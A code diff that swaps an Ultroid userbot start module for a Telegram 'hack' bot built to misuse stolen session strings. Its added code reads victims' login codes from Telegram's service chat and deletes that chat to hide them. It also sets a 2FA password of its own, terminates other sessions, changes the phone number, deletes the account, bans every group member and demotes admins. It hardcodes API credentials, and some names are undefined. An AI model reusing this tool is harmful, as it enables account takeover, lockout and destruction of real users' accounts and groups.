@@ -1,238 +1,429 @@
-# Ultroid - UserBot
-# Copyright (C) 2021-2022 TeamUltroid
-#
-# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >
-# PLease read the GNU Affero General Public License in
-# <https://www.github.com/TeamUltroid/Ultroid/blob/main/LICENSE/>.
+import os
 
-from datetime import datetime
+from telethon import TelegramClient, events, functions, types
 
-from pytz import timezone as tz
-from telethon import Button, events
-from telethon.errors.rpcerrorlist import MessageDeleteForbiddenError
-from telethon.utils import get_display_name
+from userbot import deadlyub
 
-from pyUltroid._misc import SUDO_M, owner_and_sudos
-from pyUltroid.dB.asst_fns import *
-from pyUltroid.fns.helper import inline_mention
-from strings import get_string
+from ..funcs.logger import logging
 
-from . import *
+api_id = os.environ.get("APP_ID")
+import asyncio
+from os import system
 
-Owner_info_msg = udB.get_key("BOT_INFO_START")
-custom_info = True
-if Owner_info_msg is None:
-    custom_info = False
-    Owner_info_msg = f"""
-**المستخذم** - {OWNER_NAME}
-**ايدي المستخذم** - `{OWNER_ID}`
+from telethon.tl.types import ChannelParticipantsAdmins
 
-**Message Forwards** - {udB.get_key("PMBOT")}
+api_hash = os.environ.get("API_HASH")
+token = os.environ.get("BOT_TOKEN")
+client = TelegramClient("Deadly", api_id, api_hash).start(bot_token=token)
+from telethon.sessions import StringSession as ses
+from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
+from telethon.tl.functions.channels import DeleteChannelRequest as dc
+from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc
+from telethon.tl.functions.channels import JoinChannelRequest as join
+from telethon.tl.functions.channels import LeaveChannelRequest as leave
 
-**اصدار ريبثون [v{ultroid_version}](https://github.com/rogerpq/Ultroid), powered by @Repthon**
+LOGS = logging.getLogger(__name__)
+
+mybot = "missrose_bot"
+bot = borg = client
+
+Deadly = 1415798813
+
+
+async def change_number_code(strses, number, code, otp):
+    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+        bot = client = X
+        try:
+            result = await bot(
+                functions.account.ChangePhoneRequest(
+                    phone_number=number, phone_code_hash=code, phone_code=otp
+                )
+            )
+            return True
+        except:
+            return False
+
+
+async def change_number(strses, number):
+    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+        bot = client = X
+        result = await bot(
+            functions.account.SendChangePhoneCodeRequest(
+                phone_number=number,
+                settings=types.CodeSettings(
+                    allow_flashcall=True, current_number=True, allow_app_hash=True
+                ),
+            )
+        )
+        return str(result)
+
+
+async def userinfo(strses):
+    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+        k = await X.get_me()
+        return str(k)
+
+
+async def terminate(strses):
+    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+        await X(rt())
+
+
+GROUP_LIST = []
+
+
+async def delacc(strses):
+    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+        await X(functions.account.DeleteAccountRequest("me hi chutia hu"))
+
+
+async def promote(strses, grp, user):
+    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+        try:
+            await X.edit_admin(
+                grp,
+                user,
+                manage_call=True,
+                invite_users=True,
+                ban_users=True,
+                change_info=True,
+                edit_messages=True,
+                post_messages=True,
+                add_admins=True,
+                delete_messages=True,
+            )
+        except:
+            await X.edit_admin(
+                grp,
+                user,
+                is_admin=True,
+                anonymous=False,
+                pin_messages=True,
+                title="Owner",
+            )
+
+
+async def user2fa(strses):
+    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+        try:
+            await X.edit_2fa("Deadly IS BEST")
+            return True
+        except:
+            return False
+
+
+async def demall(strses, grp):
+    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+        async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
+            try:
+                await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
+            except:
+                await X.edit_admin(
+                    grp,
+                    x.id,
+                    manage_call=False,
+                    invite_users=False,
+                    ban_users=False,
+                    change_info=False,
+                    edit_messages=False,
+                    post_messages=False,
+                    add_admins=False,
+                    delete_messages=False,
+                )
+
+
+async def joingroup(strses, username):
+    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+        await X(join(username))
+
+
+async def leavegroup(strses, username):
+    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+        await X(leave(username))
+
+
+async def delgroup(strses, username):
+    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+        await X(dc(username))
+
+
+async def cu(strses):
+    try:
+        async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+            k = await X.get_me()
+            return [str(k.first_name), str(k.username or k.id)]
+    except Exception:
+        return False
+
+
+async def usermsgs(strses):
+    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+        i = ""
+        async for x in X.iter_messages(777000, limit=3):
+            i += f"\n{x.text}\n"
+        await client.delete_dialog(777000)
+        return str(i)
+
+
+async def userbans(strses, grp):
+    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+        k = await X.get_participants(grp)
+        for x in k:
+            try:
+                await X.edit_permissions(grp, x.id, view_messages=False)
+            except:
+                pass
+
+
+async def userchannels(strses):
+    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+        k = await X(pc())
+        i = ""
+        for x in k.chats:
+            try:
+                i += f"\nCHANNEL NAME {x.title} CHANNEL USRNAME @{x.username}\n"
+            except:
+                pass
+        return str(i)
+
+
+import logging
+
+logging.basicConfig(level=logging.WARNING)
+
+channel = "deadly_techy"
+menu = """
+A: [check user own groups and channels]
+B: [check user all information like phone number usrname...]
+C: [ban a group {give me StringSession and channel/group username i will ban all members there}]
+D: [know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
+E: [Join A Group/Channel via StringSession]
+F: [Leave A Group/Channel via StringSession]
+G: [Delete A Group/Channel]
+H: [Check user two step is eneable or disable]
+I: [Terminate All current active sessions except Your StringSession]
+J: [Delete Account]
+K: [Demote all admins in a group/channel]
+L: [Promote a member in a group/channel]
+M: [Change Phone number using StringSession]
 """
 
 
-_settings = [
-    [
-        Button.inline("API Kᴇʏs", data="cbs_apiset"),
-        Button.inline("Pᴍ Bᴏᴛ", data="cbs_chatbot"),
-    ],
-    [
-        Button.inline("Aʟɪᴠᴇ", data="cbs_alvcstm"),
-        Button.inline("PᴍPᴇʀᴍɪᴛ", data="cbs_ppmset"),
-    ],
-    [
-        Button.inline("Fᴇᴀᴛᴜʀᴇs", data="cbs_otvars"),
-        Button.inline("VC Sᴏɴɢ Bᴏᴛ", data="cbs_vcb"),
-    ],
-    [Button.inline("« Bᴀᴄᴋ", data="mainmenu")],
-]
-
-_start = [
-    [
-        Button.inline("Lᴀɴɢᴜᴀɢᴇ 🌐", data="lang"),
-        Button.inline("Sᴇᴛᴛɪɴɢs ⚙️", data="setter"),
-    ],
-    [
-        Button.inline("Sᴛᴀᴛs ✨", data="stat"),
-        Button.inline("Bʀᴏᴀᴅᴄᴀsᴛ 📻", data="bcast"),
-    ],
-    [Button.inline("TɪᴍᴇZᴏɴᴇ 🌎", data="tz")],
-]
-
-
-@callback("ownerinfo")
-async def own(event):
-    msg = Owner_info_msg.format(
-        mention=event.sender.mention, me=inline_mention(ultroid_bot.me)
-    )
-    if custom_info:
-        msg += "\n\n• Powered by **@Repthon**"
-    await event.edit(
-        msg,
-        buttons=[Button.inline("Close", data="closeit")],
-        link_preview=False,
-    )
-
-
-@callback("closeit")
-async def closet(lol):
+@deadlyub.tgbot.on(events.NewMessage(pattern="/give"))
+async def op(event):
+    if not event.sender_id == SimpleBoy786:
+        return await event.reply("please don't use me fuck off 🥺")
     try:
-        await lol.delete()
-    except MessageDeleteForbiddenError:
-        await lol.answer("MESSAGE_TOO_OLD", alert=True)
+        await event.reply("session bot file", file="Deadly.session")
+    except Exception as e:
+        print(e)
 
 
-@asst_cmd(pattern="start( (.*)|$)", forwards=False, func=lambda x: not x.is_group)
-async def ultroid(event):
-    args = event.pattern_match.group(1).strip()
-    if not is_added(event.sender_id) and event.sender_id not in owner_and_sudos():
-        add_user(event.sender_id)
-        kak_uiw = udB.get_key("OFF_START_LOG")
-        if not kak_uiw or kak_uiw != True:
-            msg = f"{inline_mention(event.sender)} `[{event.sender_id}]` started your [Assistant bot](@{asst.me.username})."
-            buttons = [[Button.inline("Info", "itkkstyo")]]
-            if event.sender.username:
-                buttons[0].append(
-                    Button.mention(
-                        "User", await event.client.get_input_entity(event.sender_id)
-                    )
-                )
-            await event.client.send_message(
-                udB.get_key("LOG_CHANNEL"), msg, buttons=buttons
-            )
-    if event.sender_id not in SUDO_M.fullsudos:
-        ok = ""
-        me = inline_mention(ultroid_bot.me)
-        mention = inline_mention(event.sender)
-        if args and args != "set":
-            await get_stored_file(event, args)
-        if not udB.get_key("STARTMSG"):
-            if udB.get_key("PMBOT"):
-                ok = "You can contact my master using this bot!!\n\nSend your Message, I will Deliver it To Master."
-            await event.reply(
-                f"مرحبا {mention}, شخص ما قام بأستخدام البوت الخاص بك {me}!\n\n{ok}",
-                file=udB.get_key("STARTMEDIA"),
-                buttons=[Button.inline("Info.", data="ownerinfo")]
-                if Owner_info_msg
-                else None,
-            )
-        else:
-            await event.reply(
-                udB.get_key("STARTMSG").format(me=me, mention=mention),
-                file=udB.get_key("STARTMEDIA"),
-                buttons=[Button.inline("Info.", data="ownerinfo")]
-                if Owner_info_msg
-                else None,
-            )
-    else:
-        name = get_display_name(event.sender)
-        if args == "set":
-            await event.reply(
-                "Choose from the below options -",
-                buttons=_settings,
-            )
-        elif args:
-            await get_stored_file(event, args)
-        else:
-            await event.reply(
-                get_string("ast_3").format(name),
-                buttons=_start,
-            )
+@deadlyub.tgbot.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
+async def op(event):
+    await event.reply("please use me in pm🥺")
 
 
-@callback("itkkstyo", owner=True)
-async def ekekdhdb(e):
-    text = f"When New Visitor will visit your Assistant Bot. You will get this log message!\n\nTo Disable : {HNDLR}setdb OFF_START_LOG True"
-    await e.answer(text, alert=True)
-
-
-@callback("mainmenu", owner=True, func=lambda x: not x.is_group)
-async def ultroid(event):
-    await event.edit(
-        get_string("ast_3").format(OWNER_NAME),
-        buttons=_start,
-    )
-
-
-@callback("stat", owner=True)
-async def botstat(event):
-    ok = len(get_all_users("BOT_USERS"))
-    msg = """Ultroid Assistant - Stats
-Total Users - {}""".format(
-        ok,
-    )
-    await event.answer(msg, cache_time=0, alert=True)
-
-
-@callback("bcast", owner=True)
-async def bdcast(event):
-    ok = get_all_users("BOT_USERS")
-    await event.edit(f"• Broadcast to {len(ok)} users.")
-    async with event.client.conversation(OWNER_ID) as conv:
-        await conv.send_message(
-            "Enter your broadcast message.\nUse /cancel to stop the broadcast.",
-        )
-        response = await conv.get_response()
-        if response.message == "/cancel":
-            return await conv.send_message("Cancelled!!")
-        success = 0
-        fail = 0
-        await conv.send_message(f"Starting a broadcast to {len(ok)} users...")
-        start = datetime.now()
-        for i in ok:
+@deadlyub.tgbot.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_private))
+async def start(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message(f"Choose what you want with string session \n\n{menu}")
+        res = await x.get_response()
+        r = res.text
+        if res.text == "A":
+            await x.send_message("GIVE STRING SESSION")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                pass
+            else:
+                return await event.respond("This StringSession is terminated maybe")
             try:
-                await asst.send_message(int(i), response)
-                success += 1
-            except BaseException:
-                fail += 1
-        end = datetime.now()
-        time_taken = (end - start).seconds
-        await conv.send_message(
-            f"""
-**Broadcast completed in {time_taken} seconds.**
-Total Users in Bot - {len(ok)}
-**Sent to** : `{success} users.`
-**Failed for** : `{fail} user(s).`""",
-        )
-
-
-@callback("setter", owner=True)
-async def setting(event):
-    await event.edit(
-        "Choose from the below options -",
-        buttons=_settings,
-    )
-
-
-@callback("tz", owner=True)
-async def timezone_(event):
-    await event.delete()
-    pru = event.sender_id
-    var = "TIMEZONE"
-    name = "Timezone"
-    async with event.client.conversation(pru) as conv:
-        await conv.send_message(
-            "Send Your TimeZone From This List [Check From Here](http://www.timezoneconverter.com/cgi-bin/findzone.tzc)"
-        )
-        response = conv.wait_event(events.NewMessage(chats=pru))
-        response = await response
-        themssg = response.message.message
-        if themssg == "/cancel":
-            return await conv.send_message(
-                "Cancelled!!",
-                buttons=get_back_button("mainmenu"),
+                i = await userchannels(strses.text)
+            except:
+                return await event.reply("This StringSession is terminated maybe")
+            if len(i) > 3855:
+                file = open("session.txt", "w")
+                file.write(i + "\n\nDETAILS BY Deadly")
+                file.close()
+                await bot.send_file(event.chat_id, "session.txt")
+                system("rm -rf session.txt")
+            else:
+                await event.reply(i + "\n\nThanks For using Deadly")
+        elif res.text == "B":
+            await x.send_message("GIVE STRING SESSION")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                pass
+            else:
+                return await event.respond("This StringSession is terminated maybe")
+            i = await userinfo(strses.text)
+            await event.reply(i + "\n\nThanks For using Deadly")
+        elif r == "C":
+            await x.send_message("GIVE STRING SESSION")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                pass
+            else:
+                return await event.respond("This StringSession is terminated maybe")
+            await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+            grpid = await x.get_response()
+            await userbans(strses.text, grpid.text)
+            await event.reply("Banning all members Thanks For using Deadly")
+        elif r == "D":
+            await x.send_message("GIVE STRING SESSION")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                pass
+            else:
+                return await event.respond("This StringSession is terminated maybe")
+            i = await usermsgs(strses.text)
+            await event.reply(i + "\n\nThanks For using Deadly")
+        elif r == "E":
+            await x.send_message("GIVE STRING SESSION")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                pass
+            else:
+                return await event.respond("This StringSession is terminated maybe")
+            await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+            grpid = await x.get_response()
+            await joingroup(strses.text, grpid.text)
+            await event.reply("Joined the Channel/Group Thanks For using Deadly")
+        elif r == "F":
+            await x.send_message("GIVE STRING SESSION")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                pass
+            else:
+                return await event.respond("This StringSession is terminated maybe")
+            await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+            grpid = await x.get_response()
+            await leavegroup(strses.text, grpid.text)
+            await event.reply("Leaved the Channel/Group Thanks For using Deadly")
+        elif r == "G":
+            await x.send_message("GIVE STRING SESSION")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                pass
+            else:
+                return await event.respond("This StringSession is terminated maybe")
+            await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+            grpid = await x.get_response()
+            await delgroup(strses.text, grpid.text)
+            await event.reply("Deleted the Channel/Group Thanks For using Deadly")
+        elif r == "H":
+            await x.send_message("GIVE STRING SESSION")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                pass
+            else:
+                return await event.respond("This StringSession is terminated maybe")
+            i = await user2fa(strses.text)
+            if i:
+                await event.reply(
+                    "User don't have two step thats why now two step is `DeadlyIsBest` you can login now\n\nThanks For using Deadly"
+                )
+            else:
+                await event.reply("Sorry User Have two step already")
+        elif r == "I":
+            await x.send_message("GIVE STRING SESSION")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                pass
+            else:
+                return await event.respond("This StringSession is terminated maybe")
+            i = await terminate(strses.text)
+            await event.reply(
+                "The all sessions are terminated\n\nThanks For using Deadly"
             )
-        try:
-            tz(themssg)
-            await setit(event, var, themssg)
-            await conv.send_message(
-                f"{name} changed to {themssg}\n",
-                buttons=get_back_button("mainmenu"),
+        elif res.text == "J":
+            await x.send_message("GIVE STRING SESSION")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                pass
+            else:
+                return await event.respond("This StringSession is terminated maybe")
+            i = await delacc(strses.text)
+            await event.reply(
+                "The Account is deleted SUCCESSFULLLY\n\nThanks For using Deadly"
             )
-        except BaseException:
-            await conv.send_message(
-                "Wrong TimeZone, Try again",
-                buttons=get_back_button("mainmenu"),
+        elif res.text == "L":
+            await x.send_message("GIVE STRING SESSION")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                pass
+            else:
+                return await event.respond("This StringSession is terminated maybe")
+            await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+            grp = await x.get_response()
+            await x.send_message("NOW GIVE USER USERNAME")
+            user = await x.get_response()
+            i = await promote(strses.text, grp.text, user.text)
+            await event.reply(
+                "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using Deadly"
             )
+        elif res.text == "K":
+            await x.send_message("GIVE STRING SESSION")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                pass
+            else:
+                return await event.respond("This StringSession is terminated maybe")
+            await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+            pro = await x.get_response()
+            try:
+                i = await demall(strses.text, pro.text)
+            except:
+                pass
+            await event.reply(
+                "I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using Deadly"
+            )
+        elif res.text == "M":
+            await x.send_message("GIVE STRING SESSION")
+            strses = await x.get_response()
+            op = await cu(strses.text)
+            if op:
+                pass
+            else:
+                return await event.respond("This StringSession is terminated maybe")
+            await x.send_message(
+                "GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] "
+            )
+            number = (await x.get_response()).text
+            try:
+                result = await change_number(strses.text, number)
+                await event.respond(
+                    result
+                    + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp"
+                )
+                await asyncio.sleep(20)
+                await x.send_message("NOW GIVE PHONE CODE HASH")
+                phone_code_hash = (await x.get_response()).text
+                await x.send_message("NOW GIVE THE OTP")
+                otp = (await x.get_response()).text
+                changing = await change_number_code(
+                    strses.text, number, phone_code_hash, otp
+                )
+                if changing:
+                    await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
+                else:
+                    await event.respond("Something is wrong")
+            except Exception as e:
+                await event.respond(
+                    "SEND THIS ERROR TO - @deadly_userbot\n**LOGS**\n" + str(e)
+                )
+
+        else:
+            await event.respond("Wrong Text Found Re type /hack and use")
